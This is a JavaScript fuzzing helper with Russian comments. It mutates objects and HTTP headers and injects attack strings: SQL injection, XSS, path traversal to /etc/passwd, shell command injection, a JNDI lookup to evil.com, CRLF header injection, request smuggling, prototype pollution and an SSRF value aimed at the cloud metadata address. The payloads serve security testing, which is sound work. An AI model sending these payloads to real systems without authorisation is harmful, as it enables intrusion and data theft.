// StructureMutator.js - РАСШИРЕННАЯ ВЕРСИЯ
export default class StructureMutator {
    // ========== СУЩЕСТВУЮЩИЕ МЕТОДЫ ==========
    
    mutateObjectExtreme(obj, depth = 0, maxDepth = 10, seen = new WeakSet()) {
        if (obj === null || obj === undefined) return null;
        if (typeof obj === 'object') {
            if (seen.has(obj)) return null;
            seen.add(obj);
        }
        if (depth > maxDepth) return null;
        if (Array.isArray(obj)) {
            const length = Math.min(obj.length + Math.floor(Math.random() * 20), 25);
            return Array.from({ length }, () =>
                this.mutateObjectExtreme(obj[Math.floor(Math.random() * obj.length)] || null, depth + 1, maxDepth, seen)
            );
        }
        if (typeof obj === 'object') {
            const mutated = {};
            const keys = Object.keys(obj);
            for (const key of keys) {
                const value = obj[key];
                const choice = Math.floor(Math.random() * 10);
                switch (choice) {
                    case 0: mutated[key] = null; break;
                    case 1: mutated[key] = ''; break;
                    case 2: mutated[key] = 123456789; break;
                    case 3: mutated[key] = true; break;
                    case 4: mutated[key] = []; break;
                    case 5: mutated[key] = {}; break;
                    case 6: mutated[key] = '💥⚡🔥'; break;
                    case 7: mutated[key] = this.mutateObjectExtreme(value, depth + 1, maxDepth, seen); break;
                    case 8: mutated[key] = [null, '', 0, true, 'test']; break;
                    case 9: mutated[key] = { nested: 'value', deeper: { more: 'stuff' } }; break;
                }
            }
            if (Math.random() < 0.3 && keys.length > 0) {
                const cycleKey = keys[Math.floor(Math.random() * keys.length)];
                mutated[cycleKey] = mutated;
            }
            return mutated;
        }
        const primChoice = Math.floor(Math.random() * 6);
        switch (primChoice) {
            case 0: return null;
            case 1: return '';
            case 2: return 123456789;
            case 3: return true;
            case 4: return '🔥💀⚡';
            case 5: return [null, 'x', 99];
        }
    }

    recursiveInject(obj, mode = 'injection') {
        if (!obj || typeof obj !== 'object') return;
        for (const key of Object.keys(obj)) {
            const value = obj[key];
            if (typeof value === 'string') {
                if (mode === 'injection') {
                    const injections = [
                        "' OR 1=1--", "<script>alert(1)</script>", "../../../../etc/passwd",
                        "`whoami`", "; ls -la;", "0", "''", "NaN", "Infinity"
                    ];
                    obj[key] = injections[Math.floor(Math.random() * injections.length)];
                } else if (mode === 'large') {
                    obj[key] = 'A'.repeat(10000);
                }
            } else if (typeof value === 'number') {
                obj[key] = mode === 'large' ? Number.MAX_SAFE_INTEGER : value;
            } else if (typeof value === 'boolean') {
                obj[key] = mode === 'injection' ? !value : value;
            } else if (Array.isArray(value)) {
                value.forEach((v, i) => {
                    if (typeof v === 'object' && v !== null) this.recursiveInject(v, mode);
                    else value[i] = mode === 'large' ? 'A'.repeat(10000) : value[i];
                });
            } else if (typeof value === 'object' && value !== null) {
                this.recursiveInject(value, mode);
            }
        }
    }

    // ========== НОВЫЕ МЕТОДЫ ДЛЯ ЗАГОЛОВКОВ ==========
    
    /**
     * Мутация заголовков
     * @param {Object} headers - исходные заголовки
     * @param {string} mode - 'injection', 'large', 'extreme'
     * @returns {Object} - мутированные заголовки
     */
    mutateHeaders(headers, mode = 'injection') {
        const mutated = { ...headers };
        
        // Вредоносные значения для заголовков
        const maliciousValues = {
            injection: [
                "' OR 1=1--",
                "<script>alert(1)</script>",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "test\r\nX-Injected: malicious",
                "test%0d%0aX-Injected:%20malicious",
                "'; DROP TABLE users; --",
                "`id`",
                "$(whoami)",
                "| cat /etc/passwd"
            ],
            large: [
                'A'.repeat(5000),
                'B'.repeat(10000),
                'X'.repeat(20000),
                '🔥'.repeat(3000)
            ],
            extreme: [
                null,
                undefined,
                123456789,
                true,
                false,
                {},
                [],
                '',
                '💥⚡🔥💀'
            ]
        };
        
        // Список стандартных заголовков для мутации
        const commonHeaders = [
            'User-Agent', 'Referer', 'Origin', 'Accept', 'Accept-Language',
            'Accept-Encoding', 'Content-Type', 'Authorization', 'X-Forwarded-For',
            'X-Request-ID', 'X-Custom-Header', 'X-API-Key', 'Cookie', 'Host'
        ];
        
        // Мутируем существующие заголовки
        for (const [key, value] of Object.entries(mutated)) {
            if (mode === 'injection') {
                mutated[key] = maliciousValues.injection[Math.floor(Math.random() * maliciousValues.injection.length)];
            } else if (mode === 'large') {
                mutated[key] = maliciousValues.large[Math.floor(Math.random() * maliciousValues.large.length)];
            } else if (mode === 'extreme') {
                mutated[key] = maliciousValues.extreme[Math.floor(Math.random() * maliciousValues.extreme.length)];
            }
        }
        
        // Добавляем новые вредоносные заголовки
        if (Math.random() > 0.5) {
            const randomHeader = commonHeaders[Math.floor(Math.random() * commonHeaders.length)];
            if (mode === 'injection') {
                mutated[randomHeader] = maliciousValues.injection[Math.floor(Math.random() * maliciousValues.injection.length)];
            } else if (mode === 'large') {
                mutated[randomHeader] = maliciousValues.large[Math.floor(Math.random() * maliciousValues.large.length)];
            }
        }
        
        // Добавляем неожиданные заголовки
        const unexpectedHeaders = [
            'X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL', 'X-HTTP-Method-Override',
            'X-Proxy-URL', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'X-Forwarded-Scheme'
        ];
        
        if (Math.random() > 0.7) {
            const unexpectedHeader = unexpectedHeaders[Math.floor(Math.random() * unexpectedHeaders.length)];
            mutated[unexpectedHeader] = mode === 'injection' ? 'evil.com' : 'http://evil.com';
        }
        
        // Добавляем CRLF инъекции
        if (mode === 'injection' && Math.random() > 0.6) {
            mutated['X-CRLF-Test'] = 'test\r\nX-Injected: true';
            mutated['User-Agent'] = 'test%0d%0aX-Injected:%20true';
        }
        
        return mutated;
    }
    
    /**
     * Генерация экстремальных заголовков
     * @returns {Object} - экстремальные заголовки
     */
    generateExtremeHeaders() {
        return {
            'X-Buffer-Overflow': 'A'.repeat(50000),
            'X-Null-Byte': '\x00\x00\x00',
            'X-Control-Chars': '\x01\x02\x03\x04\x05',
            'X-Unicode': '🔥💀⚡' + '😈'.repeat(100),
            'X-Malicious-JSON': '{"__proto__": {"polluted": true}}',
            'X-SQL-Injection': "' OR '1'='1' --",
            'X-XSS-Payload': '<script>alert(1)</script>',
            'X-Path-Traversal': '../../../etc/passwd',
            'X-SSRF': 'http://169.254.169.254/latest/meta-data/',
            'X-Command-Injection': '; ls -la; cat /etc/passwd',
            'X-Prototype-Pollution': '__proto__.polluted=true',
            'X-Header-Smuggling': 'test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK'
        };
    }
}